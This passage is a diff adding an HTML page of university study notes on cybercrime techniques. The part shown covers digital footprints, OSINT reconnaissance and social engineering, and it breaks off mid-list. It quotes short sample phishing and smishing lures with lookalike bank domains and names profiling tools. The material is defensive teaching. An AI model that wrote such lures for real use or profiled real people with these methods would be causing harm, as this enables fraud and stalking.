@@ -1,0 +1,1689 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Unit 2 — Cyber Crime Techniques | ICS MCA Notes</title>
+<!-- <link rel="stylesheet" href="/css/unit_css_master.css"> -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.0/chart.umd.min.js"></script>
+
+<!-- ════════ UNIT 2 ICS INLINE STYLES ════════ -->
+<style>
+
+  /* ── CRIME TYPE CARD GRID (3-col) ── */
+  .crime-type-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 0;
+    border: var(--border);
+    margin: 1.2rem 0;
+    overflow: hidden;
+  }
+  .ctg-card {
+    padding: 1rem;
+    border-right: 2px solid var(--black);
+    border-bottom: 2px solid var(--black);
+  }
+  .ctg-card:nth-child(3n)        { border-right: none; }
+  .ctg-card:nth-last-child(-n+3) { border-bottom: none; }
+  .ctg-card .ctg-icon  { font-size: 1.5rem; display: block; margin-bottom: 0.3rem; }
+  .ctg-card h4 { font-family: 'Playfair Display', serif; font-size: 0.95rem; margin-bottom: 0.3rem; }
+  .ctg-card p  { font-size: 0.85rem; line-height: 1.55; }
+  .ctg-card .ctg-eg {
+    margin-top: 0.4rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.67rem;
+    color: var(--gray-500);
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    border-top: var(--border-thin);
+    padding-top: 0.3rem;
+  }
+  .cc-red    { background:#fdf2f2; border-left:4px solid #c0392b; }
+  .cc-amber  { background:#fff9ec; border-left:4px solid #e6ac00; }
+  .cc-blue   { background:#eef8ff; border-left:4px solid #0c8da0; }
+  .cc-purple { background:#f3f0fa; border-left:4px solid #6f42c1; }
+  .cc-green  { background:#f0faf2; border-left:4px solid #1a7a34; }
+  .cc-dark   { background:#f0f0ee; border-left:4px solid #3a3a36; }
+
+  /* ── PHASE STRIP ── */
+  .phase-strip {
+    display: flex; gap: 0; margin: 1.2rem 0; overflow-x: auto;
+  }
+  .phase-block {
+    flex: 1; min-width: 110px; padding: 0.9rem 0.6rem;
+    text-align: center; border-right: 2px solid #fff;
+    font-family: 'Source Serif 4', serif;
+  }
+  .phase-block:last-child { border-right: none; }
+  .phase-block .ph-num   { font-family:'JetBrains Mono',monospace; font-size:1.4rem; font-weight:700; display:block; margin-bottom:0.2rem; }
+  .phase-block .ph-title { font-size:0.82rem; font-weight:600; display:block; margin-bottom:0.25rem; }
+  .phase-block .ph-desc  { font-size:0.74rem; line-height:1.4; opacity:0.86; }
+  .ph-1 { background:#fde8d8; color:#7d3c00; }
+  .ph-2 { background:#fff3cd; color:#8a6500; }
+  .ph-3 { background:#d1ecf1; color:#065a68; }
+  .ph-4 { background:#d4edda; color:#155724; }
+  .ph-5 { background:#e2d9f3; color:#4a1d96; }
+  .ph-6 { background:#f8d7da; color:#922b21; }
+  .ph-7 { background:#fde8d8; color:#7d3c00; }
+
+  /* ── HACKER-TYPE CARD (2-col) ── */
+  .two-col-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 0;
+    border: var(--border);
+    margin: 1.2rem 0;
+    overflow: hidden;
+  }
+  .two-col-card {
+    padding: 1.1rem 1rem;
+    border-right: 2px solid var(--black);
+    border-bottom: 2px solid var(--black);
+  }
+  .two-col-card:nth-child(even) { border-right: none; }
+  .two-col-card:nth-last-child(-n+2) { border-bottom: none; }
+  .two-col-card .tc-icon { font-size: 1.5rem; display: block; margin-bottom: 0.4rem; }
+  .two-col-card h4 { font-family: 'Playfair Display', serif; font-size: 0.96rem; margin-bottom: 0.35rem; }
+  .two-col-card p { font-size: 0.85rem; line-height: 1.56; }
+  .two-col-card .tc-eg {
+    margin-top: 0.4rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.67rem;
+    color: var(--gray-500);
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    border-top: var(--border-thin);
+    padding-top: 0.3rem;
+  }
+
+  /* ── NMAP CODE BLOCK ── */
+  .code-block {
+    background: #1e1e2e;
+    color: #cdd6f4;
+    border-radius: 6px;
+    padding: 1rem 1.2rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.7;
+    margin: 1rem 0;
+    overflow-x: auto;
+    border-left: 4px solid #6f42c1;
+  }
+  .code-block .cmd-comment { color: #6c7086; }
+  .code-block .cmd-flag    { color: #89b4fa; }
+  .code-block .cmd-target  { color: #a6e3a1; }
+  .code-block .cmd-output  { color: #fab387; }
+  .code-block .cmd-keyword { color: #f38ba8; }
+
+  /* ── CASE STUDY BOX ── */
+  .case-study-box {
+    border: 2px solid var(--black);
+    margin: 1.5rem 0;
+    overflow: hidden;
+  }
+  .cs-header {
+    background: var(--black);
+    color: var(--white);
+    padding: 0.6rem 1.2rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+  .cs-body { padding: 1.2rem 1.2rem 1rem; }
+  .cs-section { margin-bottom: 0.9rem; }
+  .cs-section-title {
+    font-family: 'Playfair Display', serif;
+    font-size: 0.88rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    color: var(--gray-500);
+    margin-bottom: 0.25rem;
+    padding-bottom: 0.2rem;
+    border-bottom: var(--border-thin);
+  }
+  .cs-section p, .cs-section ul { font-size: 0.875rem; line-height: 1.6; }
+  .cs-section ul { padding-left: 1.2rem; }
+  .cs-section li { margin: 0.2rem 0; }
+  .cs-outcome {
+    background: #f0faf2;
+    border-left: 4px solid #1a7a34;
+    padding: 0.7rem 1rem;
+    font-size: 0.85rem;
+    margin-top: 0.8rem;
+  }
+  .cs-outcome strong { color: #1a7a34; }
+
+  /* ── APT STAGE BOXES ── */
+  .apt-chain {
+    display: flex;
+    gap: 0;
+    margin: 1.2rem 0;
+    overflow-x: auto;
+    border: var(--border);
+  }
+  .apt-step {
+    flex: 1;
+    min-width: 100px;
+    padding: 0.9rem 0.6rem;
+    text-align: center;
+    border-right: 2px solid var(--black);
+    position: relative;
+  }
+  .apt-step:last-child { border-right: none; }
+  .apt-step .apt-num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 1.1rem;
+    font-weight: 700;
+    display: block;
+    margin-bottom: 0.25rem;
+  }
+  .apt-step .apt-name {
+    font-size: 0.75rem;
+    font-weight: 600;
+    display: block;
+    margin-bottom: 0.3rem;
+    line-height: 1.3;
+  }
+  .apt-step .apt-desc {
+    font-size: 0.7rem;
+    line-height: 1.4;
+    opacity: 0.82;
+  }
+  .apt-1 { background:#fde8d8; color:#7d3c00; }
+  .apt-2 { background:#fff3cd; color:#8a6500; }
+  .apt-3 { background:#fdf2f2; color:#7b241c; }
+  .apt-4 { background:#f3f0fa; color:#4a1d96; }
+  .apt-5 { background:#eef8ff; color:#065a68; }
+  .apt-6 { background:#d4edda; color:#155724; }
+  .apt-7 { background:#f0f0ee; color:#3a3a36; }
+
+  /* ── IMPACT GRID (2-col) ── */
+  .impact-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 0;
+    border: var(--border);
+    margin: 1.2rem 0;
+    overflow: hidden;
+  }
+  .imp-card {
+    padding: 1rem 1.1rem;
+    border-right: 2px solid var(--black);
+    border-bottom: 2px solid var(--black);
+  }
+  .imp-card:nth-child(even) { border-right: none; }
+  .imp-card:nth-last-child(-n+2) { border-bottom: none; }
+  .imp-card .imp-icon { font-size: 1.4rem; display: block; margin-bottom: 0.3rem; }
+  .imp-card h4 { font-family:'Playfair Display',serif; font-size:0.96rem; margin-bottom:0.3rem; }
+  .imp-card p  { font-size:0.86rem; line-height:1.56; }
+  .imp-a { background:#fdf2f2; border-left:4px solid #c0392b; }
+  .imp-b { background:#fff9ec; border-left:4px solid #e6ac00; }
+  .imp-c { background:#f3f0fa; border-left:4px solid #6f42c1; }
+  .imp-d { background:#eef8ff; border-left:4px solid #0c8da0; }
+  .imp-e { background:#fde8d8; border-left:4px solid #e67e22; }
+  .imp-f { background:#f0faf2; border-left:4px solid #1a7a34; }
+
+  @media(max-width:680px){
+    .crime-type-grid { grid-template-columns: 1fr; }
+    .ctg-card        { border-right:none !important; border-bottom:2px solid var(--black) !important; }
+    .ctg-card:last-child { border-bottom:none !important; }
+    .two-col-grid    { grid-template-columns: 1fr; }
+    .two-col-card    { border-right:none !important; }
+    .apt-chain       { flex-wrap:wrap; }
+    .apt-step        { min-width:44%; }
+    .impact-grid     { grid-template-columns: 1fr; }
+    .imp-card        { border-right:none !important; }
+    .phase-strip     { flex-wrap:wrap; }
+    .phase-block     { min-width:44%; }
+  }
+
+  /* ── Inline master CSS fallback vars (if external CSS not loaded) ── */
+  :root {
+    --black: #1a1a16;
+    --white: #fafaf8;
+    --border: 2px solid #1a1a16;
+    --border-thin: 1px solid #d0d0c8;
+    --gray-500: #7a7a72;
+    --gray-700: #3a3a36;
+  }
+</style>
+
+<!-- ════ MASTER CSS FALLBACK (self-contained) ════ -->
+<style id="master-fallback">
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Source Serif 4', Georgia, serif; font-size: 16px; line-height: 1.65; background: #fafaf8; color: #1a1a16; }
+
+  @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=JetBrains+Mono:wght@400;500;700&family=Source+Serif+4:wght@300;400;600&display=swap');
+
+  /* NAV */
+  .top-nav { position:sticky;top:0;z-index:100;background:#1a1a16;display:flex;align-items:center;justify-content:space-between;padding:0 1.5rem;height:52px; }
+  .nav-brand { color:#fafaf8;font-family:'JetBrains Mono',monospace;font-size:0.85rem;text-decoration:none;letter-spacing:0.05em; }
+  .nav-brand span { font-weight:700;color:#e6ac00; }
+  .nav-toggle { display:none;background:none;border:1px solid #fafaf8;color:#fafaf8;padding:4px 10px;cursor:pointer;font-size:0.75rem; }
+  .nav-links { display:flex;gap:0;list-style:none; }
+  .nav-links a { color:#c0bdb6;text-decoration:none;padding:0 1rem;height:52px;display:flex;align-items:center;font-size:0.8rem;font-family:'JetBrains Mono',monospace;letter-spacing:0.04em;border-left:1px solid #333;transition:background 0.15s; }
+  .nav-links a:hover,.nav-links a.active { background:#333;color:#fafaf8; }
+
+  /* PAGE HEADER */
+  .page-header { background:#1a1a16;color:#fafaf8;padding:3rem 2rem 2rem;text-align:center; }
+  .unit-badge { font-family:'JetBrains Mono',monospace;font-size:0.7rem;text-transform:uppercase;letter-spacing:0.15em;color:#e6ac00;margin-bottom:0.8rem; }
+  .page-header h1 { font-family:'Playfair Display',serif;font-size:clamp(2rem,5vw,3.2rem);font-weight:900;line-height:1.1;margin-bottom:0.8rem; }
+  .subject-line { font-size:0.82rem;color:#a0a098;margin-bottom:1.5rem;letter-spacing:0.03em; }
+  .quick-info { display:flex;flex-wrap:wrap;justify-content:center;gap:0;border-top:1px solid #333;border-left:1px solid #333;margin-top:1.5rem; }
+  .quick-info-item { padding:0.7rem 1.5rem;border-right:1px solid #333;border-bottom:1px solid #333;text-align:center;font-size:0.78rem;color:#a0a098; }
+  .quick-info-item strong { display:block;color:#fafaf8;font-size:0.88rem;margin-top:0.2rem; }
+
+  /* TOC */
+  .toc-wrap { background:#fff9ec;border-bottom:2px solid #1a1a16;padding:1.5rem 2rem; }
+  .toc-box { max-width:900px;margin:0 auto; }
+  .toc-box h3 { font-family:'Playfair Display',serif;font-size:1rem;margin-bottom:0.8rem; }
+  .toc-box ol { padding-left:1.2rem;columns:2;gap:2rem; }
+  .toc-box li { font-size:0.875rem;margin:0.3rem 0; }
+  .toc-box a { color:#1a1a16;text-decoration:none;border-bottom:1px dashed #999; }
+  .toc-box a:hover { color:#c0392b; }
+
+  /* CONTENT */
+  .content-wrap { max-width:900px;margin:0 auto;padding:2rem 1.5rem 4rem; }
+  .topic-section { margin-bottom:1rem; }
+  .topic-label { font-family:'JetBrains Mono',monospace;font-size:0.68rem;text-transform:uppercase;letter-spacing:0.12em;color:#7a7a72;margin-bottom:0.4rem; }
+  .topic-title { font-family:'Playfair Display',serif;font-size:clamp(1.4rem,3vw,1.9rem);font-weight:900;line-height:1.2;margin-bottom:1.2rem;padding-bottom:0.7rem;border-bottom:2px solid #1a1a16; }
+  .content-wrap h3 { font-family:'Playfair Display',serif;font-size:1.15rem;font-weight:700;margin:1.5rem 0 0.6rem; }
+  .content-wrap h4 { font-family:'Source Serif 4',serif;font-size:1rem;font-weight:600;margin:1.2rem 0 0.4rem; }
+  .content-wrap p  { margin-bottom:0.8rem; }
+  .content-wrap ul,.content-wrap ol { padding-left:1.3rem;margin-bottom:0.8rem; }
+  .content-wrap li { margin:0.3rem 0; }
+  .section-divider { border:none;border-top:2px solid #1a1a16;margin:2.5rem 0; }
+
+  /* BOXES */
+  .concept-box { background:#f0f0ee;border-left:4px solid #1a1a16;padding:1rem 1.2rem;margin:1rem 0 1.2rem;font-size:0.93rem;line-height:1.65; }
+  .tip-box { background:#fff9ec;border:2px solid #e6ac00;padding:0.9rem 1.1rem;margin:1rem 0; }
+  .tip-label { font-family:'JetBrains Mono',monospace;font-size:0.68rem;text-transform:uppercase;letter-spacing:0.1em;font-weight:700;color:#8a6500;margin-bottom:0.35rem; }
+  .warn-box { background:#fdf2f2;border:2px solid #c0392b;padding:0.9rem 1.1rem;margin:1rem 0; }
+  .warn-label { font-family:'JetBrains Mono',monospace;font-size:0.68rem;text-transform:uppercase;letter-spacing:0.1em;font-weight:700;color:#922b21;margin-bottom:0.35rem; }
+  .example-box { background:#eef8ff;border:2px solid #0c8da0;padding:0.9rem 1.1rem;margin:1rem 0; }
+  .ex-label { font-family:'JetBrains Mono',monospace;font-size:0.68rem;text-transform:uppercase;letter-spacing:0.1em;font-weight:700;color:#065a68;margin-bottom:0.35rem; }
+  .formula-box { background:#1a1a16;color:#fafaf8;font-family:'JetBrains Mono',monospace;font-size:0.9rem;padding:0.7rem 1.2rem;margin:1rem 0;text-align:center;letter-spacing:0.05em; }
+  .conclusion-box { background:#1a1a16;color:#fafaf8;padding:1.5rem;margin:2rem 0; }
+  .con-label { font-family:'JetBrains Mono',monospace;font-size:0.68rem;text-transform:uppercase;letter-spacing:0.12em;color:#e6ac00;margin-bottom:0.6rem; }
+  .ref-box { background:#f7f7f5;border:1px solid #d0d0c8;padding:0.9rem 1.1rem;margin:1.2rem 0; }
+  .ref-label { font-family:'JetBrains Mono',monospace;font-size:0.68rem;text-transform:uppercase;letter-spacing:0.1em;color:#7a7a72;font-weight:700;margin-bottom:0.4rem; }
+  .ref-box ul { padding-left:1.1rem;font-size:0.8rem;color:#555; }
+  .ref-box li { margin:0.2rem 0; }
+
+  /* THREE CARD GRID */
+  .three-grid { display:grid;grid-template-columns:repeat(3,1fr);gap:0;border:2px solid #1a1a16;margin:1.2rem 0;overflow:hidden; }
+  .three-card { padding:1.1rem 1rem;border-right:2px solid #1a1a16;border-bottom:2px solid #1a1a16; }
+  .three-card:nth-child(3n) { border-right:none; }
+  .three-card:nth-last-child(-n+3) { border-bottom:none; }
+  .card-icon { font-size:1.5rem;display:block;margin-bottom:0.4rem; }
+  .three-card h4 { font-family:'Playfair Display',serif;font-size:0.93rem;margin-bottom:0.35rem; }
+  .three-card p  { font-size:0.84rem;line-height:1.55; }
+
+  /* COMPARE GRID */
+  .compare-grid { display:grid;grid-template-columns:1fr 1fr;gap:0;border:2px solid #1a1a16;margin:1.2rem 0;overflow:hidden; }
+  .compare-card { padding:1.1rem 1rem;border-right:2px solid #1a1a16; }
+  .compare-card:last-child { border-right:none; }
+  .compare-card h4 { font-family:'Playfair Display',serif;font-size:0.95rem;margin-bottom:0.5rem;padding-bottom:0.35rem;border-bottom:1px solid #d0d0c8; }
+  .compare-card ul { padding-left:1.1rem;font-size:0.85rem; }
+  .compare-card li { margin:0.3rem 0; }
+
+  /* DATA TABLE */
+  .data-table { width:100%;border-collapse:collapse;margin:1rem 0;font-size:0.875rem; }
+  .data-table thead { background:#1a1a16;color:#fafaf8; }
+  .data-table th { padding:0.6rem 0.9rem;text-align:left;font-family:'JetBrains Mono',monospace;font-size:0.72rem;text-transform:uppercase;letter-spacing:0.06em; }
+  .data-table td { padding:0.6rem 0.9rem;border-bottom:1px solid #d0d0c8; }
+  .data-table.no-bold td { font-weight:400; }
+  .data-table tbody tr:nth-child(even) { background:#f7f7f5; }
+
+  /* DIAGRAM */
+  .diagram-wrap { border:2px solid #1a1a16;margin:1.5rem 0; }
+  .diagram-title { background:#1a1a16;color:#fafaf8;padding:0.5rem 1rem;font-family:'JetBrains Mono',monospace;font-size:0.72rem;text-transform:uppercase;letter-spacing:0.08em; }
+  .chart-container { padding:1.2rem;background:#fff; }
+
+  /* FOOTER */
+  .page-footer { background:#1a1a16;color:#a0a098;padding:1.5rem;margin-top:3rem; }
+  .footer-inner { max-width:900px;margin:0 auto;display:flex;flex-wrap:wrap;gap:0.5rem;align-items:center;justify-content:space-between;font-size:0.78rem; }
+  .footer-links { display:flex;gap:1rem; }
+  .footer-links a { color:#e6ac00;text-decoration:none; }
+
+  /* BACK TOP */
+  .back-top { position:fixed;bottom:1.5rem;right:1.5rem;background:#1a1a16;color:#fafaf8;border:none;width:40px;height:40px;border-radius:50%;cursor:pointer;font-size:1rem;display:none;align-items:center;justify-content:center; }
+  .back-top.visible { display:flex; }
+
+  @media(max-width:680px){
+    .top-nav { flex-wrap:wrap;height:auto;padding:0.6rem 1rem; }
+    .nav-toggle { display:block; }
+    .nav-links { width:100%;flex-direction:column;display:none;border-top:1px solid #333; }
+    .nav-links.open { display:flex; }
+    .nav-links a { height:auto;padding:0.7rem 1rem;border-left:none;border-top:1px solid #333; }
+    .toc-box ol { columns:1; }
+    .three-grid { grid-template-columns:1fr; }
+    .three-card { border-right:none !important;border-bottom:2px solid #1a1a16; }
+    .three-card:last-child { border-bottom:none; }
+    .compare-grid { grid-template-columns:1fr; }
+    .compare-card { border-right:none;border-bottom:2px solid #1a1a16; }
+    .compare-card:last-child { border-bottom:none; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ════════════ NAVIGATION ════════════ -->
+<nav class="top-nav">
+  <a href="ICS_Index.html" class="nav-brand"><span>ICS</span> · Introduction to Cyber Security</a>
+  <button class="nav-toggle" onclick="document.querySelector('.nav-links').classList.toggle('open')">MENU</button>
+  <ul class="nav-links">
+    <li><a href="ics_sem01_index.html">Home</a></li>
+    <li><a href="unit01_sem01_ics.html">Unit 1</a></li>
+    <li><a href="#" class="active">Unit 2</a></li>
+    <li><a href="#">Unit 3</a></li>
+    <li><a href="#">Unit 4</a></li>
+  </ul>
+</nav>
+
+<!-- ════════════ PAGE HEADER ════════════ -->
+<header class="page-header">
+  <div class="unit-badge">Unit 02 · Cyber Crime Techniques</div>
+  <h1>Cyber Crime<br>Techniques</h1>
+  <div class="subject-line">F.Y. M.C.A. (Management) · Semester I · 2024 Pattern · Savitribai Phule Pune University</div>
+  <div class="quick-info">
+    <div class="quick-info-item">Topics Covered<strong>10 Topics + Case Study</strong></div>
+    <div class="quick-info-item">Exam Weightage<strong>~16–18 Marks</strong></div>
+    <div class="quick-info-item">Key Focus<strong>Attack Methods &amp; Tools</strong></div>
+    <div class="quick-info-item">Difficulty<strong>Intermediate</strong></div>
+  </div>
+</header>
+
+<!-- ════════════ TOC ════════════ -->
+<div class="toc-wrap">
+  <div class="toc-box">
+    <h3>Topics in This Unit</h3>
+    <ol>
+      <li><a href="#t2-1">2.1 — Digital Footprint</a></li>
+      <li><a href="#t2-2">2.2 — Social Media &amp; Social Engineering Tactics</a></li>
+      <li><a href="#t2-3">2.3 — Exploiting Vulnerabilities in Software and Hardware</a></li>
+      <li><a href="#t2-4">2.4 — Botnets and DDoS Attacks</a></li>
+      <li><a href="#t2-5">2.5 — Advanced Persistent Threats (APTs)</a></li>
+      <li><a href="#t2-6">2.6 — Web Attacks: Browser &amp; User Targeting</a></li>
+      <li><a href="#t2-7">2.7 — Obtaining User/Website Data &amp; Email Attacks</a></li>
+      <li><a href="#t2-8">2.8 — Network Vulnerabilities &amp; Nmap Scanning</a></li>
+      <li><a href="#t2-9">2.9 — Impact of AI and IoT on Cybercrime</a></li>
+      <li><a href="#t2-10">2.10 — The Dark Web and Cybercrime</a></li>
+      <li><a href="#t2-cs">Case Study — Importance of Cyber Hygiene</a></li>
+    </ol>
+  </div>
+</div>
+
+<!-- ════════════ MAIN CONTENT ════════════ -->
+<main class="content-wrap">
+
+<!-- ══════════════════════════════════════
+     TOPIC 2.1 — DIGITAL FOOTPRINT
+══════════════════════════════════════ -->
+<section class="topic-section" id="t2-1">
+  <div class="topic-label">Topic 2.1</div>
+  <h2 class="topic-title">Digital Footprint</h2>
+
+  <div class="concept-box">
+    A <strong>Digital Footprint</strong> is the trail of data that a person or organisation leaves behind as a result of their activities in digital environments — intentional or not. Every online action — browsing a website, posting on social media, making a payment, logging into an app — contributes to this footprint. Cybercriminals systematically harvest and analyse digital footprints to profile targets, plan attacks, and evade detection.
+  </div>
+
+  <div class="tip-box">
+    <div class="tip-label">📌 Last Night Tip</div>
+    Two types: <strong>Active</strong> (data you consciously share — posts, profiles, form fills) and <strong>Passive</strong> (data collected without your awareness — cookies, IP logs, metadata). Cybercriminals use digital footprints in the <strong>Reconnaissance phase</strong> of an attack. OSINT (Open Source Intelligence) is the formal discipline of collecting footprint data from public sources.
+  </div>
+
+  <h3>Types of Digital Footprint</h3>
+  <div class="two-col-grid">
+    <div class="two-col-card imp-a">
+      <span class="tc-icon">📢</span>
+      <h4>Active Digital Footprint</h4>
+      <p>Data deliberately shared by the user with full awareness — social media posts, comments, forum answers, profile details, uploaded photos, app registrations, email subscriptions, online forms, and e-commerce orders. The user consciously chose to create this data trail.</p>
+      <div class="tc-eg">Facebook profile · LinkedIn bio · Reddit posts · Instagram photos · Google Form responses</div>
+    </div>
+    <div class="two-col-card imp-b">
+      <span class="tc-icon">👣</span>
+      <h4>Passive Digital Footprint</h4>
+      <p>Data collected about the user <em>without their active input</em> — browser cookies tracking visited sites, IP address logs on every server visited, GPS location data embedded in photos (EXIF), browsing history sold by ISPs, device fingerprinting, and advertising trackers following users across websites.</p>
+      <div class="tc-eg">Cookies · Browser history · Device fingerprint · EXIF metadata · Ad tracking pixels</div>
+    </div>
+  </div>
+
+  <h3>How Cybercriminals Exploit Digital Footprints</h3>
+  <div class="three-grid">
+    <div class="three-card">
+      <span class="card-icon">🎯</span>
+      <h4>Target Profiling</h4>
+      <p>Attackers compile detailed profiles using LinkedIn (job role, employer, colleagues), Facebook (personal life, family, location), Twitter/X (opinions, travel, events). This profile informs a highly personalised spear-phishing attack that the victim is far more likely to trust.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">🔑</span>
+      <h4>Password Guessing</h4>
+      <p>Most people build passwords from personally meaningful information — pet names, birthdays, hometowns, sports teams. A digital footprint analysis often reveals all these details. Attackers build <strong>custom wordlists</strong> using tools like CUPP (Common User Passwords Profiler) from footprint data.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">🕵️</span>
+      <h4>OSINT-Based Reconnaissance</h4>
+      <p>Using tools like Maltego, Shodan, theHarvester, and Google Dorking, attackers piece together email addresses, phone numbers, business relationships, infrastructure details, and location history — entirely from public sources before making a single direct contact with the victim.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">💬</span>
+      <h4>Social Engineering Leverage</h4>
+      <p>Attackers use footprint information to create convincing pretexts — "I noticed you attended the Pune TechFest last month…" — that make victims lower their guard. The more specific the reference, the more the victim assumes the contact is legitimate and trustworthy.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">📍</span>
+      <h4>Location-Based Targeting</h4>
+      <p>Geo-tagged social media posts, check-ins, and "away from home" travel announcements allow criminals to determine when a victim's home is empty (for physical burglary), where they regularly commute (for mugging), or their daily patterns (for stalking).</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">🧩</span>
+      <h4>Identity Reconstruction</h4>
+      <p>Even when individual data points seem harmless, combining them — name + employer + phone + email + photo + location — allows full identity reconstruction for <strong>identity theft</strong>, <strong>account takeover</strong>, or <strong>synthetic identity fraud</strong> (creating new fake identities from real fragments).</p>
+    </div>
+  </div>
+
+  <div class="example-box">
+    <div class="ex-label">Real-World Example — EXIF Metadata Exposure</div>
+    <strong>Case:</strong> A journalist in India posts a high-resolution photo on Twitter taken on their smartphone — seemingly just a workplace selfie. Unknown to them, the photo contains EXIF metadata including GPS coordinates (latitude/longitude), device model, date and time. An attacker extracts this metadata using online tools (Jeffrey's Exif Viewer, ExifTool) and maps the GPS co-ordinates — revealing the journalist's home address. This was used in a 2019 case of targeted harassment of journalists in India. <strong>Fix:</strong> Remove EXIF data before uploading using tools like ExifCleaner or use your phone's "remove location" setting when sharing photos.
+  </div>
+
+  <h3>Minimising Your Digital Footprint</h3>
+  <table class="data-table no-bold">
+    <thead><tr><th>Action</th><th>What It Prevents</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Use a VPN</strong></td><td>Hides your real IP address from websites and ISPs — prevents passive IP-based tracking and ISP data sale</td></tr>
+      <tr><td><strong>Enable private/incognito browsing</strong></td><td>Prevents local storage of cookies and browsing history (does not hide from ISP or website)</td></tr>
+      <tr><td><strong>Audit social media privacy settings</strong></td><td>Limits access to your active footprint data — ensures only intended audiences see your posts and profile</td></tr>
+      <tr><td><strong>Strip EXIF from photos</strong></td><td>Removes GPS co-ordinates and device information embedded in photos before uploading</td></tr>
+      <tr><td><strong>Use separate email addresses</strong></td><td>Prevents cross-service tracking and reduces data aggregation by advertising networks</td></tr>
+      <tr><td><strong>Google yourself regularly</strong></td><td>Identifies what data about you is publicly accessible — enables targeted removal requests (Right to Erasure under DPDPA 2023)</td></tr>
+    </tbody>
+  </table>
+
+  <div class="ref-box">
+    <div class="ref-label">References</div>
+    <ul>
+      <li>Shodan Search Engine: https://www.shodan.io</li>
+      <li>Maltego OSINT Tool: https://www.maltego.com</li>
+      <li>EXIF Metadata Viewer: https://exifdata.com</li>
+      <li>CERT-IN Advisory on OSINT Threats: https://www.cert-in.org.in</li>
+    </ul>
+  </div>
+</section>
+
+<hr class="section-divider">
+
+<!-- ══════════════════════════════════════
+     TOPIC 2.2 — SOCIAL MEDIA & SOCIAL ENGINEERING
+══════════════════════════════════════ -->
+<section class="topic-section" id="t2-2">
+  <div class="topic-label">Topic 2.2</div>
+  <h2 class="topic-title">Social Media and Social Engineering Tactics</h2>
+
+  <div class="concept-box">
+    <strong>Social Engineering</strong> is the art of manipulating people — rather than systems — into performing actions or divulging confidential information. It exploits human psychology rather than technical vulnerabilities: trust, authority, fear, urgency, helpfulness, and curiosity. Social media platforms have become the primary arena for social engineering because they provide attackers with rich target intelligence and direct communication channels.
+  </div>
+
+  <div class="tip-box">
+    <div class="tip-label">📌 Last Night Tip</div>
+    Kevin Mitnick — the world's most famous hacker — famously said: <em>"The human factor is truly security's weakest link."</em> Remember the <strong>6 Cialdini Principles</strong> exploited in social engineering: <strong>Reciprocity, Authority, Scarcity, Social Proof, Liking, Commitment.</strong> The most common social engineering attacks are: <strong>Phishing, Vishing, Smishing, Pretexting, Baiting, Tailgating, Quid Pro Quo.</strong>
+  </div>
+
+  <h3>Social Engineering Attack Techniques</h3>
+
+  <div class="crime-type-grid">
+    <div class="ctg-card cc-red">
+      <span class="ctg-icon">🎣</span>
+      <h4>Phishing</h4>
+      <p>Mass-sending fraudulent emails impersonating trusted entities (banks, IRCTC, PayTM, HDFC, Income Tax) to trick recipients into clicking malicious links, entering credentials on fake sites, or downloading malware-laden attachments. The most common cyber attack globally.</p>
+      <div class="ctg-eg">Fake SBI email: "Your account is suspended — verify now at sbi-secure-login.net"</div>
+    </div>
+    <div class="ctg-card cc-amber">
+      <span class="ctg-icon">🎯</span>
+      <h4>Spear Phishing</h4>
+      <p>Highly targeted phishing using specific personal details about the victim (gathered from digital footprint) to make the attack more convincing. Unlike mass phishing, the attacker crafts a unique message mentioning the victim's name, employer, role, recent activities, or colleagues.</p>
+      <div class="ctg-eg">"Hi Priya, your invoice from Cognizant IT Services (invoice #INV-4821) is attached…"</div>
+    </div>
+    <div class="ctg-card cc-blue">
+      <span class="ctg-icon">📞</span>
+      <h4>Vishing (Voice Phishing)</h4>
+      <p>Phone-based social engineering — attackers call victims impersonating bank officials, TRAI, CBI, police, or tech support. In India's "Digital Arrest" scam, attackers conduct fake video calls in police/CBI uniforms, intimidating victims into transferring money.</p>
+      <div class="ctg-eg">India's Digital Arrest scam — victims transferred ₹1,900 crore in 2023 (I4C data)</div>
+    </div>
+    <div class="ctg-card cc-purple">
+      <span class="ctg-icon">📱</span>
+      <h4>Smishing (SMS Phishing)</h4>
+      <p>Phishing delivered via SMS — "Your HDFC account is blocked. Click: hdfc-unblock.com" or fake OTPs. More effective than email phishing because SMS has no spam filter, appears on mobile home screen, and users are conditioned to respond to SMS alerts from banks.</p>
+      <div class="ctg-eg">"ALERT: Your UPI ID is deactivated. Reactivate: bit.ly/upi-verify" — fake NPCI SMS</div>
+    </div>
+    <div class="ctg-card cc-green">
+      <span class="ctg-icon">🎭</span>
+      <h4>Pretexting</h4>
+      <p>Creating a fabricated scenario (pretext) to manipulate the target — e.g. impersonating an IT support technician who "needs your credentials to fix your account," or a journalist seeking comment, or a background verification agent confirming employment details.</p>
+      <div class="ctg-eg">Attacker poses as new employee's IT onboarding assistant to obtain VPN credentials</div>
+    </div>
+    <div class="ctg-card cc-dark">
+      <span class="ctg-icon">🖱️</span>
+      <h4>Baiting</h4>
